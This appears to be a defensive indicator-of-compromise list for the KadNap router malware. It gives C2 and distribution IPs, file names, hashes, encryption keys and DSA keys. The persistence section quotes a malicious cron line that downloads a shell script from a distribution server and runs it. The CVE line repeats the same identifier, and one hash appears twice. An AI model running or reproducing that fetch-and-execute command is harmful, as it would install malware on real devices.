# A Collection of IOCs Related To The KadNap Malware

## Known CVES Exploited

```
CVE-2018-18471 + CVE-2018-18471 - Axentra HipServ XXE 2 RCE (Seagate / Netgear/ Medion Lifecloud)
```

## C2 Servers - Use kadnap_detect.py For Up-To-Date C2 Server Discovery

```
190.97.167.128
```

## Malware Distribution Servers

```
88.119.175.67
216.146.25.201
```

## Filesystem IOCs

### Staging Scripts

These have the same name on the distribution servers and on disk.

```
aic.sh
anp.sh
sto.sh
```

## Persistence Scripts

### Cron Jobs

```
cru a 7RBbzD5E5xmr "55 * * * * /jffs/.asusrouter"
44 * * * * root ps -A | grep -q [k]ad && exit 0;wget -O /tmp/sto.sh http://88.119.175.67/sto.sh && chmod +x /tmp/sto.sh && /tmp/sto.sh
```

### Persistence Related Scripts

```
/jffs/.asusrouter
```

### Malware Binary File Names

```
# On Distribution Server

00101001r1
00100001r1
01001001r1
00100100r3
00100100r1
00101011r1

# On Disk

/tmp/kad
/jffs/kad

```

## Known Binary Hashes

### MD5

```
045f0810df28100fb2cb3bf2f1a8c266
133b382e162c2f4a2c353650468e83c8
2d2c38edcd7581de477ecebfba657b43
402559e0302bb9c8ac45401ae74bf0e7
7f8f455161cde85d5b6b71c6b26684d4
857877becdf15da4c100592803ead9e1
945a43d4867c321d3230cd5c17e2e133
95578d55e7affee1db646578b1eea7ba
f4f162c9836e9f715ecb8e0e1f3a875a
2211eb390424ec81f0e5a27e2b710dcc
2daefc69e7cd897f86a385a041f089d4
5e0ab4ab2b53e8e1dbb74dd97c03979d
763a720a3813883640a34d102c7efe66
```

### SHA256

```
bb15d65f3222090bfd534ad27960c580b11792ab5d17888df99cfe5f4fc93c44
0c374e5d0f898043b9d3a7376ded59e80c368af25a2b89c469702ed102ffb965
270ec9ec455b5997e463764aaf58f353a5aa7b505f4008bfa5f71e9284ae2a38
70d3096b6f6085e542cb91ec0a290e043c621207f7a117e6486e54317d89b82e
9465e0195e9829ec0decd6957aedc73898ab5d6f6c275d0b972fb7aee5eb73a8
a773b9e55fb33aff4ba609db70ef52bcef3830ace98dda7b902b31a1a0aa605d
bb15d65f3222090bfd534ad27960c580b11792ab5d17888df99cfe5f4fc93c44
f91f45eca8e13080f764ca02d650d39a2d79b419aa4f9bec531ef9a8a5cd76ab
fabba0def129b717c55f6f1eabbf7f05eda90b2d4be9878bd7b4e856ac6d03c3
fce49e8489d7cccf48df05b078f7ce97cc9d1f216b070eac2ca659e6bb52e92a
0b3dbb951de7a216dd5032d783ba7d0a5ecda2bf872643c3a4ddd1667fb38ffe
699274f45f36352b20cf878f57840b1ea21649bf52f66edf19db7ef73a2b5316
d02d9058e0f4ed2aab292f6610f412edadbbeea9cc45a508af4a90cd0e47631f
e04185c48401d2ef9777cea79d165cfbd78dfc454fecccb75f2b0f6396c17cc6
```

## Encryption Keys

### AES KEYS

```
jV9YUDanATgt9E8Sd39jPEFgSaxDWbmV # NEW
qFHV7xjr8XprzZsd26yUJ3vAYQUHprbG # OLD
```

### XOR KEYS

```
SfdHWRYy2fUd2WdH9MGvD4vtVDduAPrXxeDuwsxfa8T74FF4nXRDGKSgG6E57XnZ # NEW
6YL5aNSQv9hLJ42aDKqmnArjES4jxRbfPTnZDdBdpRhJkHJdxqMQmeyCrkg2CBQg # OLD
```

### DSA PUBLIC KEYS

DSA subgroup order (q) per lineage. 
A C2 auth signature is considered valid when its r and s both fall in
[1, q) — well-formed DSA signature components for that operator key.

OLD_DSA_Q = 0xf83a979e356e7aa29d2283d5d07dfc0c0dd1aceb27758d53badde8a5
NEW_DSA_Q = 0xc2a32c1c8b3790792da196312422c94b1472fe1e7ca7213bc94d60a3


```
# Old

-----BEGIN PUBLIC KEY-----
MIIBwDCCATQGByqGSM44BAEwggEnAoGBANVrxHHBQhHiTet9ZhfkqJL89QMoaxwA
IdMOT1lUzafUOurcSQf5uxmSTddQm+UIZ7ttqEo/79CIgbzMBF8/JWwy3Cul7yfD
NRwSUAGv2HfkBZvNXqrwmuwGfdFPRWFxoD8Q87ehyG1V3zCKf0YdRPK9kwPRnH8w
aFpKcqTsi1FtAh0A+DqXnjVueqKdIoPV0H38DA3RrOsndY1Tut3opQKBgQDACXs4
cE4EzO9js9gzJIauxnB3UlRkXPwrAgW/WEtEhyTaeT0+5KfBAXp+5U6bHzS+L4CH
HkXCoYY3Tt5MpwZi+ZbeqWFy87eR5iNKwhvYLSyKCKhAqicN2R2kaAUYZzTItKEc
M2IxV5zc8HNzhodGNw+iUxds+Vug7pEE1GSzQQOBhQACgYEAlc1lACt+wtrrj/Ur
Kln/Pmv1Kk2R1uXbK4nDb9SJozAr1uPH71nwBXhzlEXg85il5bhTp0pp6LtF+HSF
VDdPxlQ3sAKgmNKVHTa9Y98pnPE9GYYhltZ7fb+TS5rn5fmLxrqU4R9QqTRB2uaI
Xl+VF9h+8qbZyFtkGGdT4iunCFg=
-----END PUBLIC KEY-----

# New

-----BEGIN PUBLIC KEY-----
MIIDQjCCAjUGByqGSM44BAEwggIoAoIBAQCcAzKjk9EY39LOBVnEl0kJV4pfvtr6
HJ4GO68HIrFKUUEAFpOiFZZc2f2PmxS+O6w9r1GUGFWg+XrLN9bBsXcCRvBFilmM
d//bEj2TH/pkKzQuMX3EEt6wkZ0fe0/7S+z9tzKRQu4QE8+h+9x762l7krrpnY7s
/6bk8HzPfGMcZscnL7zfJF2uCBtNuKfN6m8T8Hd+iA3bZCSa92OBkSj169wQ+GJ3
x5mqBsbOmLO2qnPuMHWP31YYerrw1H2t6BbWOUEvKCTMGzBINSBpbsKTJxvlCdYv
EMML2okiOQekBiSXI5gkSt61ac7oWkEJL6ouwZ5jA4QBEdX9Kjq5cov3Ah0AwqMs
HIs3kHktoZYxJCLJSxRy/h58pyE7yU1gowKCAQAnM01YLXwacCal6Hichq+mK625
FHtUmpC8L0YiEemQPNhzqgtuNH1rv58ALfcw78uwDI36f43FGBCGUC3g6gPqdQHs
W66GLARGgWcgso0X4pr9UszCWiemOcrsjNwjM7J4R1pNwf18WDp7LYNNvarGgfWV
kPrMlr3qu3IF9Ppil0XZ7eGF3qgYQSD7E6DnewPeiWFhY2w29HPwX77DuMywz7bj
C+SJEmKLKOTX5BNTWKN5jFG3q91Kny84LAvSOmy8A6vzgd6AZF53px3jLlJGCY4X
cXd18d8ZuKOKIMldw5AkA9zo22EjoulcE+HH63+/7wbGMM9HHqW6ILzSQtqjA4IB
BQACggEAe5dRViNgTvwFnhAHx/xOXrW5HmklFcYQYMm2NnlqO3JBKhTRWk/hG6Hs
VsOfJ7xNhViLQJWRUxKSCSk1O8aiPWtFlLPjnYpN9l8bU529ld7g7LUnJQYMRizF
6u+RGkyNRRZKdViSu0/pjk7k4o5eY+MRLfPh3wI7UImDKVTw46ujB71mdomuv7Y0
p9Dllj1ncuqPNq/qI0HYBa+gr5dQXp2TdJwOLt11HNlWOf6oZtbNIkqRITDaIlvw
JhAfaFI3QyLXVtldG8VRU4RphuK1J3EnPNeJouYAoq6CGcqxHUUbRosqPhxUM3h6
kqyeYTUJBoQhvSpaBsxQo1pWBHH8Cg==
-----END PUBLIC KEY-----
```
